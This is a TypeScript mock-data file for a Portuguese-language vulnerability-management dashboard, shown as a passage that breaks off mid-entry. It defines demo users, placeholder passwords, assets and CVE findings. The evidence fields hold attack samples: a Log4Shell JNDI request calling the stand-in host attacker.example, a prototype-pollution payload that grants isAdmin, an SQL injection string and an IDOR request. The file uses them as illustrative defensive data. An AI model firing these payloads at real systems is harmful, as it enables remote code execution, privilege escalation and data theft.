// -----------------------------------------------------------------------------
// Dados mock do Baluarte (frontend). Fonte única de estado inicial consumida por
// `@/mocks/api`. Todos os identificadores em inglês; textos exibidos em pt-BR.
//
// Invariantes garantidas por este arquivo (verificadas em `mockData.test.ts`):
//  - `severity === severityFromCvss(cvss.base)` em toda vulnerabilidade;
//  - todo `assetId/assetName/assetHost` corresponde a um item de `MOCK_ASSETS`;
//  - ids únicos por coleção;
//  - taxa de clique entre 8% e 35% nas campanhas com envios;
//  - treinamentos com ids exatos `trn-urgency`, `trn-authority`, `trn-curiosity`;
//  - destinatários gerados de forma determinística (PRNG mulberry32, sem Math.random).
// -----------------------------------------------------------------------------

import type {
  AuditEntry,
  Asset,
  Campaign,
  CampaignRecipient,
  Evidence,
  FileScan,
  NotificationPreferences,
  ScanReport,
  SecurityPolicy,
  StationDetail,
  StationPort,
  StationSoftware,
  TimelineEvent,
  Training,
  User,
  Vulnerability,
  VulnerabilityHistoryEntry,
} from '@/types';
import { severityFromCvss } from '@/lib/severity';

// -----------------------------------------------------------------------------
// Âncora temporal e utilitários de data (tudo relativo a MOCK_NOW).
// -----------------------------------------------------------------------------

/** Instante de referência do ambiente mock; todas as datas são relativas a ele. */
export const MOCK_NOW = '2026-09-10T12:00:00.000Z';

const NOW_MS = Date.parse(MOCK_NOW);
const DAY_MS = 86_400_000;
const HOUR_MS = 3_600_000;
const MINUTE_MS = 60_000;

/** ISO de `n` dias antes de MOCK_NOW (use `n` negativo para datas futuras). */
function daysAgo(n: number): string {
  return new Date(NOW_MS - n * DAY_MS).toISOString();
}

/** ISO de `n` horas antes de MOCK_NOW. */
function hoursAgo(n: number): string {
  return new Date(NOW_MS - n * HOUR_MS).toISOString();
}

// -----------------------------------------------------------------------------
// PRNG determinístico (mulberry32) e utilitários para gerar destinatários.
// NUNCA usar Math.random: os dados precisam ser estáveis entre execuções/testes.
// -----------------------------------------------------------------------------

function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const FIRST_NAMES: readonly string[] = [
  'Ana',
  'Bruno',
  'Carla',
  'Daniel',
  'Eduarda',
  'Felipe',
  'Gabriela',
  'Henrique',
  'Isabela',
  'João',
  'Larissa',
  'Marcelo',
  'Natália',
  'Otávio',
  'Patrícia',
  'Rafael',
  'Sabrina',
  'Thiago',
  'Vanessa',
  'William',
];

const LAST_NAMES: readonly string[] = [
  'Almeida',
  'Barbosa',
  'Cardoso',
  'Dias',
  'Esteves',
  'Ferreira',
  'Gonçalves',
  'Henriques',
  'Lima',
  'Martins',
  'Nunes',
  'Oliveira',
  'Pereira',
  'Queiroz',
  'Ribeiro',
  'Santos',
  'Teixeira',
  'Vieira',
  'Xavier',
  'Zanetti',
];

const RECIPIENT_DEPARTMENTS: readonly string[] = ['Financeiro', 'TI', 'RH', 'Comercial', 'Operações'];

/** Remove acentos e normaliza para uso em e-mail (`nome.sobrenome@empresa.com`). */
function slugify(value: string): string {
  return value
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase();
}

// -----------------------------------------------------------------------------
// Credenciais de acesso do ambiente mock (todas @empresa.com).
// -----------------------------------------------------------------------------

export const MOCK_CREDENTIALS: Array<{ email: string; password: string; userId: string }> = [
  { email: 'admin@empresa.com', password: 'Admin@123', userId: 'u-000' },
  { email: 'analista@empresa.com', password: 'Senha@123', userId: 'u-001' },
  { email: 'colaborador@empresa.com', password: 'Colab@123', userId: 'u-002' },
];

// -----------------------------------------------------------------------------
// Usuários (RBAC): 3 credenciais + 5 adicionais. Departamentos institucionais.
// -----------------------------------------------------------------------------

export const MOCK_USERS: User[] = [
  {
    id: 'u-000',
    name: 'Leonardo Rodrigues',
    email: 'admin@empresa.com',
    role: 'admin',
    status: 'active',
    department: 'Diretoria',
    createdAt: daysAgo(420),
    lastLoginAt: hoursAgo(3),
  },
  {
    id: 'u-001',
    name: 'Rafael Nunes',
    email: 'analista@empresa.com',
    role: 'analyst',
    status: 'active',
    department: 'TI',
    createdAt: daysAgo(360),
    lastLoginAt: hoursAgo(9),
  },
  {
    id: 'u-002',
    name: 'João Pereira',
    email: 'colaborador@empresa.com',
    role: 'collaborator',
    status: 'active',
    department: 'Comercial',
    createdAt: daysAgo(210),
    lastLoginAt: daysAgo(2),
  },
  {
    id: 'u-003',
    name: 'Edson Marcelino',
    email: 'edson.marcelino@empresa.com',
    role: 'analyst',
    status: 'active',
    department: 'TI',
    createdAt: daysAgo(340),
    lastLoginAt: daysAgo(1),
  },
  {
    id: 'u-004',
    name: 'Ana Souza',
    email: 'ana.souza@empresa.com',
    role: 'collaborator',
    status: 'active',
    department: 'Financeiro',
    createdAt: daysAgo(180),
    lastLoginAt: daysAgo(4),
  },
  {
    id: 'u-005',
    name: 'Bruno Lima',
    email: 'bruno.lima@empresa.com',
    role: 'collaborator',
    status: 'active',
    department: 'RH',
    createdAt: daysAgo(160),
    lastLoginAt: daysAgo(6),
  },
  {
    id: 'u-006',
    name: 'Carla Dias',
    email: 'carla.dias@empresa.com',
    role: 'collaborator',
    status: 'inactive',
    department: 'Comercial',
    createdAt: daysAgo(300),
    lastLoginAt: daysAgo(85),
  },
  {
    id: 'u-007',
    name: 'Marina Costa',
    email: 'marina.costa@empresa.com',
    role: 'admin',
    status: 'pending',
    department: 'Diretoria',
    createdAt: daysAgo(3),
    lastLoginAt: null,
  },
];

// -----------------------------------------------------------------------------
// Ativos monitorados. `openFindings` coerente com MOCK_VULNERABILITIES
// (contagem de achados não resolvidos/aceitos por ativo).
// -----------------------------------------------------------------------------

export const MOCK_ASSETS: Asset[] = [
  {
    id: 'asset-001',
    name: 'srv-web-01',
    type: 'server',
    host: 'srv-web-01.empresa.com',
    ip: '192.168.0.10',
    description: 'Servidor web de produção (Nginx + Node.js) que expõe o portal público.',
    status: 'active',
    owner: 'Rafael Nunes',
    createdAt: daysAgo(410),
    lastScanAt: daysAgo(5),
    openFindings: 2,
  },
  {
    id: 'asset-002',
    name: 'vpn-gateway',
    type: 'network',
    host: 'vpn.empresa.com',
    ip: '200.10.20.5',
    description: 'Concentrador VPN e gateway SSH de acesso remoto dos colaboradores.',
    status: 'active',
    owner: 'Edson Marcelino',
    createdAt: daysAgo(395),
    lastScanAt: daysAgo(2),
    openFindings: 1,
  },
  {
    id: 'asset-003',
    name: 'portal-cliente',
    type: 'application',
    host: 'portal.empresa.com',
    ip: null,
    description: 'Aplicação web voltada ao cliente final, com autenticação e área logada.',
    status: 'active',
    owner: 'Rafael Nunes',
    createdAt: daysAgo(300),
    lastScanAt: daysAgo(9),
    openFindings: 4,
  },
  {
    id: 'asset-004',
    name: 'api-pagamentos',
    type: 'application',
    host: 'api.empresa.com',
    ip: null,
    description: 'API REST de processamento de pagamentos e emissão de faturas.',
    status: 'active',
    owner: 'Leonardo Rodrigues',
    createdAt: daysAgo(280),
    lastScanAt: daysAgo(2),
    openFindings: 3,
  },
  {
    id: 'asset-005',
    name: 'db-central',
    type: 'database',
    host: 'db.empresa.com',
    ip: '10.0.5.20',
    description: 'Instância PostgreSQL central com dados transacionais e cadastrais.',
    status: 'active',
    owner: 'Edson Marcelino',
    createdAt: daysAgo(390),
    lastScanAt: daysAgo(3),
    openFindings: 0,
  },
  {
    id: 'asset-006',
    name: 'srv-legado',
    type: 'server',
    host: '192.168.0.20',
    ip: '192.168.0.20',
    description: 'Servidor Apache legado em processo de desativação; ainda hospeda relatórios internos.',
    status: 'inactive',
    owner: 'Rafael Nunes',
    createdAt: daysAgo(700),
    lastScanAt: daysAgo(22),
    openFindings: 1,
  },
];

// -----------------------------------------------------------------------------
// Vulnerabilidades — 14 achados.
// Distribuição: 3 critical, 4 high, 4 medium, 2 low, 1 info.
// Status: 7 open, 2 in_review, 2 remediating, 2 resolved, 1 accepted.
// A severidade é SEMPRE derivada do CVSS via `severityFromCvss` (invariante).
// -----------------------------------------------------------------------------

const SCANNER = 'Baluarte OWASP Engine 1.4';

/** Monta a entrada de histórico de detecção padrão. */
function detected(id: string, at: string, note: string): VulnerabilityHistoryEntry {
  return { id: `${id}-h1`, at, actor: SCANNER, action: 'detected', note };
}

/** Monta uma entrada de mudança de status. */
function statusChanged(
  id: string,
  seq: number,
  at: string,
  actor: string,
  from: Vulnerability['status'],
  to: Vulnerability['status'],
  note?: string,
): VulnerabilityHistoryEntry {
  return { id: `${id}-h${seq}`, at, actor, action: 'status_changed', from, to, note };
}

function evidence(
  id: string,
  seq: number,
  kind: Evidence['kind'],
  label: string,
  content: string,
  capturedAt: string,
): Evidence {
  return { id: `${id}-e${seq}`, kind, label, content, capturedAt };
}

export const MOCK_VULNERABILITIES: Vulnerability[] = [
  // ---- Critical (3) ---------------------------------------------------------
  {
    id: 'vuln-001',
    title: 'Execução remota de código via Log4Shell (JNDI)',
    cve: 'CVE-2021-44228',
    owaspId: 'A06:2021',
    owaspCategory: 'Vulnerable and Outdated Components',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', base: 10.0 },
    severity: severityFromCvss(10.0),
    status: 'remediating',
    assetId: 'asset-004',
    assetName: 'api-pagamentos',
    assetHost: 'api.empresa.com',
    affectedComponent: 'log4j-core',
    affectedVersion: '2.14.1',
    fixedVersion: '2.17.1',
    artifactHash: 'a8df52e8fc10981659800ac38e180fefa73fa33dfd3be11a3ca034b6a46f666a',
    description:
      'A biblioteca log4j-core registra strings controladas pelo cliente e interpola expressões JNDI, permitindo que um atacante remoto force o carregamento de classes maliciosas e execute código no servidor. O cabeçalho User-Agent é refletido nos logs sem sanitização. O impacto é crítico por conceder execução remota não autenticada na API de pagamentos.',
    evidence: [
      evidence(
        'vuln-001',
        1,
        'request',
        'Requisição de prova de conceito',
        'GET /v1/faturas HTTP/1.1\nHost: api.empresa.com\nUser-Agent: ${jndi:ldap://attacker.example/a}\nAccept: application/json',
        daysAgo(12),
      ),
      evidence(
        'vuln-001',
        2,
        'log',
        'Trecho do log da aplicação',
        '2026-08-29 09:14:22 WARN  o.a.l.c.n.JndiManager - Attempt to access ldap://attacker.example/a\njavax.naming.CommunicationException: attacker.example:389',
        daysAgo(12),
      ),
      evidence(
        'vuln-001',
        3,
        'hash',
        'Hash SHA-256 do artefato vulnerável',
        'a8df52e8fc10981659800ac38e180fefa73fa33dfd3be11a3ca034b6a46f666a',
        daysAgo(12),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Atualizar log4j-core para 2.17.1 ou superior',
        description:
          'Substituir a dependência transitiva no build (Maven/Gradle) e reconstruir a imagem do serviço.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Mitigação temporária',
        description:
          'Definir a variável de ambiente LOG4J_FORMAT_MSG_NO_LOOKUPS=true e remover a classe JndiLookup do classpath.',
        effort: 'low',
      },
      {
        order: 3,
        title: 'Bloquear egressos LDAP/RMI',
        description: 'Restringir no firewall as conexões de saída do servidor para portas 389/636/1099.',
        effort: 'medium',
      },
    ],
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/',
    ],
    detectedAt: daysAgo(12),
    updatedAt: daysAgo(4),
    history: [
      detected('vuln-001', daysAgo(12), 'Detectado pela varredura de dependências.'),
      statusChanged(
        'vuln-001',
        2,
        daysAgo(11),
        'Rafael Nunes',
        'open',
        'in_review',
        'Confirmada a exploração em ambiente controlado.',
      ),
      statusChanged(
        'vuln-001',
        3,
        daysAgo(4),
        'Edson Marcelino',
        'in_review',
        'remediating',
        'Atualização de dependência em andamento.',
      ),
    ],
  },
  {
    id: 'vuln-002',
    title: 'Backdoor na cadeia de suprimentos do xz-utils (liblzma)',
    cve: 'CVE-2024-3094',
    owaspId: 'A06:2021',
    owaspCategory: 'Vulnerable and Outdated Components',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', base: 10.0 },
    severity: severityFromCvss(10.0),
    status: 'open',
    assetId: 'asset-002',
    assetName: 'vpn-gateway',
    assetHost: 'vpn.empresa.com',
    affectedComponent: 'liblzma (xz-utils)',
    affectedVersion: '5.6.1',
    fixedVersion: '5.4.6',
    artifactHash: '55feabe6c2c8828c1e42b1f4aa298569f1dd99565b3a2f46413cab0eabe31c03',
    description:
      'A versão 5.6.1 do pacote xz-utils contém código malicioso injetado no build que altera a resolução de símbolos do sshd via liblzma, permitindo autenticação indevida por chave do atacante. O gateway VPN utiliza a biblioteca comprometida no processo SSH. Recomenda-se rebaixamento imediato para uma versão íntegra e reemissão de chaves.',
    evidence: [
      evidence(
        'vuln-002',
        1,
        'log',
        'Versão instalada do pacote',
        '$ xz --version\nxz (XZ Utils) 5.6.1\nliblzma 5.6.1',
        daysAgo(2),
      ),
      evidence(
        'vuln-002',
        2,
        'hash',
        'Hash SHA-256 da biblioteca comprometida',
        '55feabe6c2c8828c1e42b1f4aa298569f1dd99565b3a2f46413cab0eabe31c03',
        daysAgo(2),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Rebaixar xz-utils para 5.4.6',
        description: 'Aplicar o pacote corrigido pela distribuição e reiniciar o serviço sshd.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Reemitir chaves e credenciais SSH',
        description: 'Rotacionar as chaves de host e revogar chaves de usuário potencialmente expostas.',
        effort: 'high',
      },
      {
        order: 3,
        title: 'Auditar acessos recentes',
        description: 'Revisar os logs de autenticação do gateway em busca de sessões anômalas.',
        effort: 'medium',
      },
    ],
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-3094',
      'https://www.openwall.com/lists/oss-security/2024/03/29/4',
    ],
    detectedAt: daysAgo(2),
    updatedAt: daysAgo(2),
    history: [detected('vuln-002', daysAgo(2), 'Detectado na verificação de integridade de pacotes.')],
  },
  {
    id: 'vuln-003',
    title: 'Poluição de protótipo em lodash (função defaultsDeep)',
    cve: 'CVE-2019-10744',
    owaspId: 'A06:2021',
    owaspCategory: 'Vulnerable and Outdated Components',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', base: 9.1 },
    severity: severityFromCvss(9.1),
    status: 'in_review',
    assetId: 'asset-003',
    assetName: 'portal-cliente',
    assetHost: 'portal.empresa.com',
    affectedComponent: 'lodash',
    affectedVersion: '4.17.11',
    fixedVersion: '4.17.12',
    artifactHash: 'a016d964c56418864afd8daee898ceffce1228aadf0509e9ba2e09014a7347fa',
    description:
      'A função defaultsDeep do lodash permite injetar propriedades em Object.prototype quando processa dados JSON controlados pelo cliente, corrompendo o comportamento da aplicação e abrindo caminho para desvio de autorização. O portal utiliza a versão vulnerável no processamento de preferências do usuário.',
    evidence: [
      evidence(
        'vuln-003',
        1,
        'request',
        'Payload de poluição de protótipo',
        'POST /api/preferencias HTTP/1.1\nHost: portal.empresa.com\nContent-Type: application/json\n\n{"constructor":{"prototype":{"isAdmin":true}}}',
        daysAgo(9),
      ),
      evidence(
        'vuln-003',
        2,
        'note',
        'Observação do analista',
        'Após o envio, o objeto de sessão passou a expor isAdmin=true em contas comuns até o reinício do processo.',
        daysAgo(9),
      ),
      evidence(
        'vuln-003',
        3,
        'hash',
        'Hash SHA-256 do bundle afetado',
        'a016d964c56418864afd8daee898ceffce1228aadf0509e9ba2e09014a7347fa',
        daysAgo(9),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Atualizar lodash para 4.17.12 ou superior',
        description: 'Elevar a dependência e revisar usos de merge/defaultsDeep com entrada não confiável.',
        effort: 'low',
      },
      {
        order: 2,
        title: 'Validar esquema de entrada',
        description: 'Rejeitar chaves __proto__, constructor e prototype no parsing de JSON do cliente.',
        effort: 'medium',
      },
    ],
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2019-10744',
      'https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(9),
    updatedAt: daysAgo(7),
    history: [
      detected('vuln-003', daysAgo(9), 'Detectado pela varredura de composição de software.'),
      statusChanged(
        'vuln-003',
        2,
        daysAgo(7),
        'Rafael Nunes',
        'open',
        'in_review',
        'Reproduzido em ambiente de homologação.',
      ),
    ],
  },

  // ---- High (4) -------------------------------------------------------------
  {
    id: 'vuln-004',
    title: 'Condição de corrida no OpenSSH (regreSSHion)',
    cve: 'CVE-2024-6387',
    owaspId: 'A06:2021',
    owaspCategory: 'Vulnerable and Outdated Components',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H', base: 8.1 },
    severity: severityFromCvss(8.1),
    status: 'open',
    assetId: 'asset-001',
    assetName: 'srv-web-01',
    assetHost: 'srv-web-01.empresa.com',
    affectedComponent: 'OpenSSH',
    affectedVersion: '9.7p1',
    fixedVersion: '9.8p1',
    artifactHash: '16ca23fad028552829934ad81292916b11d5175645c854f53ef816e4f5fcf085',
    description:
      'Uma condição de corrida no tratamento de sinais do sshd permite execução remota de código como root em sistemas glibc. A exploração é complexa e demorada, mas viável contra o serviço SSH exposto. O servidor web executa a versão 9.7p1, afetada pela falha.',
    evidence: [
      evidence(
        'vuln-004',
        1,
        'response',
        'Banner do serviço SSH',
        '$ ssh -V srv-web-01.empresa.com\nSSH-2.0-OpenSSH_9.7p1 Ubuntu-3ubuntu0.1',
        daysAgo(5),
      ),
      evidence(
        'vuln-004',
        2,
        'hash',
        'Hash SHA-256 do binário sshd',
        '16ca23fad028552829934ad81292916b11d5175645c854f53ef816e4f5fcf085',
        daysAgo(5),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Atualizar o OpenSSH para 9.8p1',
        description: 'Aplicar o pacote corrigido e reiniciar o serviço sshd.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Reduzir a superfície de ataque',
        description: 'Definir LoginGraceTime=0 como mitigação e restringir o acesso SSH por IP de origem.',
        effort: 'low',
      },
    ],
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-6387',
      'https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt',
    ],
    detectedAt: daysAgo(5),
    updatedAt: daysAgo(5),
    history: [detected('vuln-004', daysAgo(5), 'Detectado pela varredura de serviços expostos.')],
  },
  {
    id: 'vuln-005',
    title: 'Negação de serviço HTTP/2 Rapid Reset',
    cve: 'CVE-2023-44487',
    owaspId: 'A06:2021',
    owaspCategory: 'Vulnerable and Outdated Components',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', base: 7.5 },
    severity: severityFromCvss(7.5),
    status: 'remediating',
    assetId: 'asset-001',
    assetName: 'srv-web-01',
    assetHost: 'srv-web-01.empresa.com',
    affectedComponent: 'nginx',
    affectedVersion: '1.25.1',
    fixedVersion: '1.25.3',
    artifactHash: '0d4725e36bca9d03ec1503ed57f779aa999a3a2421db8acc83a9779043c9777d',
    description:
      'O protocolo HTTP/2 permite abrir e cancelar fluxos rapidamente (RST_STREAM), o que um atacante explora para exaurir recursos do servidor com baixo custo, causando indisponibilidade. O Nginx 1.25.1 não limita adequadamente esse padrão de tráfego.',
    evidence: [
      evidence(
        'vuln-005',
        1,
        'log',
        'Pico de fluxos cancelados',
        '2026-08-26 22:11:03 [warn] 1123#0: *84213 http2 flood detected: 12840 RST_STREAM/s from 203.0.113.44',
        daysAgo(15),
      ),
      evidence(
        'vuln-005',
        2,
        'hash',
        'Hash SHA-256 do binário nginx',
        '0d4725e36bca9d03ec1503ed57f779aa999a3a2421db8acc83a9779043c9777d',
        daysAgo(15),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Atualizar o Nginx para 1.25.3',
        description: 'Aplicar a versão que mitiga o Rapid Reset e recarregar a configuração.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Limitar concorrência HTTP/2',
        description: 'Ajustar http2_max_concurrent_streams e aplicar rate limiting por cliente.',
        effort: 'low',
      },
    ],
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2023-44487',
      'https://www.cloudflare.com/learning/ddos/http2-rapid-reset-ddos-attack/',
    ],
    detectedAt: daysAgo(15),
    updatedAt: daysAgo(6),
    history: [
      detected('vuln-005', daysAgo(15), 'Detectado a partir da telemetria de tráfego HTTP/2.'),
      statusChanged(
        'vuln-005',
        2,
        daysAgo(6),
        'Edson Marcelino',
        'open',
        'remediating',
        'Rate limiting aplicado; atualização agendada.',
      ),
    ],
  },
  {
    id: 'vuln-006',
    title: 'Injeção de SQL no endpoint de busca',
    cve: null,
    owaspId: 'A03:2021',
    owaspCategory: 'Injection',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', base: 8.8 },
    severity: severityFromCvss(8.8),
    status: 'open',
    assetId: 'asset-003',
    assetName: 'portal-cliente',
    assetHost: 'portal.empresa.com',
    affectedComponent: 'Portal do Cliente (endpoint /busca)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'O parâmetro "termo" do endpoint de busca é concatenado diretamente na consulta SQL, permitindo que um usuário autenticado leia e altere dados de outros clientes. A aplicação retorna mensagens de erro do banco que confirmam a injeção. O risco é alto por expor a base transacional.',
    evidence: [
      evidence(
        'vuln-006',
        1,
        'request',
        'Requisição com payload de injeção',
        'GET /busca?termo=%27%20OR%20%271%27%3D%271 HTTP/1.1\nHost: portal.empresa.com\nCookie: sid=<sessão-válida>',
        daysAgo(20),
      ),
      evidence(
        'vuln-006',
        2,
        'response',
        'Resposta com erro do banco',
        'HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\n\n{"erro":"unterminated quoted string at or near \\"\'\\""}',
        daysAgo(20),
      ),
      evidence(
        'vuln-006',
        3,
        'note',
        'Observação do analista',
        'A carga baseada em tempo (SLEEP(5)) confirmou injeção cega além do erro verboso.',
        daysAgo(20),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Adotar consultas parametrizadas',
        description:
          'Substituir a concatenação por prepared statements/binding em todos os acessos ao banco.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Validar e normalizar entradas',
        description: 'Aplicar validação de tipo e allowlist de caracteres no parâmetro de busca.',
        effort: 'low',
      },
      {
        order: 3,
        title: 'Ocultar mensagens de erro',
        description: 'Retornar erro genérico ao cliente e registrar o detalhe apenas no log interno.',
        effort: 'low',
      },
    ],
    references: [
      'https://owasp.org/Top10/A03_2021-Injection/',
      'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(20),
    updatedAt: daysAgo(20),
    history: [detected('vuln-006', daysAgo(20), 'Detectado por teste dinâmico de aplicação (DAST).')],
  },
  {
    id: 'vuln-007',
    title: 'Referência direta insegura a objeto (IDOR) em faturas',
    cve: null,
    owaspId: 'A01:2021',
    owaspCategory: 'Broken Access Control',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', base: 8.1 },
    severity: severityFromCvss(8.1),
    status: 'in_review',
    assetId: 'asset-004',
    assetName: 'api-pagamentos',
    assetHost: 'api.empresa.com',
    affectedComponent: 'API de Pagamentos (/v1/faturas/{id})',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'O endpoint de detalhe de fatura usa o identificador sequencial da URL sem verificar se o recurso pertence ao usuário autenticado, permitindo enumerar e ler faturas de terceiros. É possível também alterar o status trocando apenas o id. A falha expõe dados financeiros sensíveis.',
    evidence: [
      evidence(
        'vuln-007',
        1,
        'request',
        'Acesso a fatura de outro usuário',
        'GET /v1/faturas/104822 HTTP/1.1\nHost: api.empresa.com\nAuthorization: Bearer <token-usuário-A>',
        daysAgo(7),
      ),
      evidence(
        'vuln-007',
        2,
        'response',
        'Resposta com dados de terceiros',
        'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":104822,"cliente":"Cliente B","valor":18400.00,"status":"em_aberto"}',
        daysAgo(7),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Verificar propriedade do recurso',
        description: 'Validar no servidor que a fatura pertence ao usuário do token antes de responder.',
        effort: 'medium',
      },
      {
        order: 2,
        title: 'Usar identificadores não sequenciais',
        description: 'Adotar UUIDs opacos para dificultar enumeração de recursos.',
        effort: 'medium',
      },
    ],
    references: [
      'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(7),
    updatedAt: daysAgo(6),
    history: [
      detected('vuln-007', daysAgo(7), 'Detectado em teste manual de controle de acesso.'),
      statusChanged(
        'vuln-007',
        2,
        daysAgo(6),
        'Leonardo Rodrigues',
        'open',
        'in_review',
        'Impacto priorizado com o time da API.',
      ),
    ],
  },

  // ---- Medium (4) -----------------------------------------------------------
  {
    id: 'vuln-008',
    title: 'Cookie de sessão sem atributos HttpOnly e Secure',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N', base: 6.5 },
    severity: severityFromCvss(6.5),
    status: 'open',
    assetId: 'asset-003',
    assetName: 'portal-cliente',
    assetHost: 'portal.empresa.com',
    affectedComponent: 'Portal do Cliente (sessão)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'O cookie de sessão é emitido sem os atributos HttpOnly e Secure, ficando acessível a scripts do lado do cliente e trafegando em conexões não cifradas. Isso facilita o roubo de sessão via XSS ou interceptação de rede.',
    evidence: [
      evidence(
        'vuln-008',
        1,
        'response',
        'Cabeçalho Set-Cookie inseguro',
        'HTTP/1.1 200 OK\nSet-Cookie: sid=a1b2c3d4e5; Path=/; SameSite=Lax',
        daysAgo(18),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Adicionar HttpOnly e Secure',
        description: 'Emitir o cookie com Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Strict.',
        effort: 'low',
      },
      {
        order: 2,
        title: 'Forçar HTTPS',
        description: 'Habilitar HSTS e redirecionar todo o tráfego HTTP para HTTPS.',
        effort: 'low',
      },
    ],
    references: [
      'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(18),
    updatedAt: daysAgo(18),
    history: [detected('vuln-008', daysAgo(18), 'Detectado na análise de cabeçalhos de resposta.')],
  },
  {
    id: 'vuln-009',
    title: 'Protocolo TLS 1.0 habilitado no gateway',
    cve: null,
    owaspId: 'A02:2021',
    owaspCategory: 'Cryptographic Failures',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N', base: 5.9 },
    severity: severityFromCvss(5.9),
    status: 'resolved',
    assetId: 'asset-002',
    assetName: 'vpn-gateway',
    assetHost: 'vpn.empresa.com',
    affectedComponent: 'Gateway VPN (TLS)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'O gateway aceitava negociação em TLS 1.0, protocolo obsoleto e suscetível a ataques como BEAST e downgrade. Um atacante em posição de rede poderia forçar o rebaixamento e comprometer a confidencialidade do tráfego. O suporte a TLS 1.0/1.1 foi desabilitado.',
    evidence: [
      evidence(
        'vuln-009',
        1,
        'log',
        'Handshake em TLS 1.0',
        '$ openssl s_client -connect vpn.empresa.com:443 -tls1\nSSL-Session:\n    Protocol  : TLSv1.0\n    Cipher    : AES128-SHA',
        daysAgo(30),
      ),
    ],
    remediation: [
      {
        order: 1,
        title: 'Desabilitar TLS 1.0 e 1.1',
        description: 'Aceitar apenas TLS 1.2 e 1.3 e remover cifras fracas da configuração.',
        effort: 'low',
      },
    ],
    references: [
      'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html',
    ],
    detectedAt: daysAgo(30),
    updatedAt: daysAgo(12),
    history: [
      detected('vuln-009', daysAgo(30), 'Detectado na análise de configuração TLS.'),
      statusChanged(
        'vuln-009',
        2,
        daysAgo(20),
        'Edson Marcelino',
        'open',
        'remediating',
        'Ajuste de configuração planejado.',
      ),
      statusChanged(
        'vuln-009',
        3,
        daysAgo(12),
        'Edson Marcelino',
        'remediating',
        'resolved',
        'TLS 1.0/1.1 desabilitados e reteste aprovado.',
      ),
    ],
  },
  {
    id: 'vuln-010',
    title: 'CORS permissivo com origem curinga',
    cve: null,
    owaspId: 'A05:2021',
    owaspCategory: 'Security Misconfiguration',
    cvss: { version: '3.1', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', base: 5.3 },
    severity: severityFromCvss(5.3),
    status: 'open',
    assetId: 'asset-004',
    assetName: 'api-pagamentos',
    assetHost: 'api.empresa.com',
    affectedComponent: 'API de Pagamentos (CORS)',
    affectedVersion: null,
    fixedVersion: null,
    artifactHash: null,
    description:
      'A API responde com Access-Control-Allow-Origin: * em endpoints autenticados, permitindo que qualquer site leia respostas em nome do usuário. Combinada a credenciais, a configuração amplia o risco de vazamento de dados entre origens.',
    evidence: [
      evidence(
        'vuln-010',
        1,
        'response',
